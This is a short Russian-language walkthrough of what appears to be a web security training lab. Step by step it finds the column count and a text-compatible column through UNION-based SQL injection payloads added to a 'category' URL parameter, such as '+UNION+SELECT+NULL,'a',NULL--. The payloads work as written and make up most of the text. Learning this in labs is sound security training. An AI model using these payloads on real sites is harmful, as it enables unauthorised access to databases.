1) Открываем любую категорию, к параметру category добавляем '+UNION+SELECT+NULL..NULL-- количество NULL подбираем как в прошлой лаборатории
2) Подходит добавление '+UNION+SELECT+NULL,NULL,NULL--
3) К параметру category пробуем добавить '+UNION+SELECT+'a',NULL,NULL-- Загружаем страницу (результат отрицательный - поля столбца не являются текстом)
4) К параметру category пробуем добавить '+UNION+SELECT+NULL,NULL,'a'-- Загружаем страницу (результат отрицательный - поля столбца не являются текстом)
5) При добавлении '+UNION+SELECT+NULL,'a',NULL-- получаем инструкции использовать имя поля La3jXz
6) Согласно полученной инструкции вместо 'a' вставляем 'La3jXz' получаем добавление '+UNION+SELECT+NULL,'La3jXz',NULL-- Загружаем страницу. Лаборатория выполнена